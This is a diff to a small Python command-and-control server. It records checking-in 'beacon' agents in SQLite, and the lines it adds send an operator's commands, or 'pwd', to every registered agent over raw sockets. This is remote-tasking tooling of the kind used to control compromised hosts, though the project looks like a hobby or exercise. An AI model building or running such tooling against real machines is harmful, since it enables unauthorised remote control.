@@ -13,16 +13,6 @@ import time
 
 from sqlite3 import Error
 
-menu_actions = {
-    'main_menu': main_menu,
-    '1': menu1,
-    '2': menu2,
-    '9': back,
-    '0': exit,
-}
-
-
-
 def getAgents():
     #Vasu fix this kthx bye!
     #Select IP, HOSTNAME, LASTCHECKED where lastseen < 5 mins
@@ -35,7 +25,16 @@ def getAgents():
         print(i[0] + "@" + i[1] + " - Last seen:" + i[2])
     
     
+def runAganistAll():
+    lst = ['localhost']
+    for i in lst:
+        PORT = 65432        # The port used by the server
 
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((i, PORT))
+            s.sendall(b'pwd')
+            s.close()
+            
 def doCommand(command):
     print("Running command: " + command)
     agentcon = sql_connection()
@@ -43,7 +42,13 @@ def doCommand(command):
     cursorObj.execute("SELECT ip FROM beacons")
     result = cursorObj.fetchall()
     for i in result:
-        #Anthony code here
+        PORT = 7025        # The port used by the server
+
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((i[0], PORT))
+            s.sendall(bytearray(command))
+            s.close()
+            
         print(i)
     time.sleep(3)
     main_menu()
@@ -164,7 +169,7 @@ def beaconHandler():
             s.listen()
             conn, addr = s.accept()
             with conn:
-                print('Connected by', addr)
+                
                 data = conn.recv(1024)
                 if not data:
                     conn.close()
@@ -172,13 +177,13 @@ def beaconHandler():
                 jsonStr = jsonVal(str(base64.b64decode(data).decode('utf-8')))
                 if(jsonStr["Type"] == True):
                     if(noBeacon(con, jsonStr["Mac"])):
-                        print("no b")
+                        
                         entities = (UID, jsonStr["Mac"], jsonStr["Hostname"],
                                     jsonStr["username"], jsonStr["devIp"], jsonStr["time"])
                         sql_insertBeacon(con, entities)
                         UID = UID+1
                     else:
-                        print("b")
+                        
                         entities = (sql_getUID(con, jsonStr["Mac"]), jsonStr["Mac"], jsonStr["Hostname"],
                                     jsonStr["username"], jsonStr["devIp"], jsonStr["time"])
                         sql_delete(con, jsonStr["Mac"])
@@ -196,6 +201,14 @@ def main():
     #port = 7025
     main_menu()
 
+
+menu_actions = {
+    'main_menu': main_menu,
+    '1': menu1,
+    '2': menu2,
+    '9': back,
+    '0': exit,
+}
 
 if __name__ == "__main__":
     main()
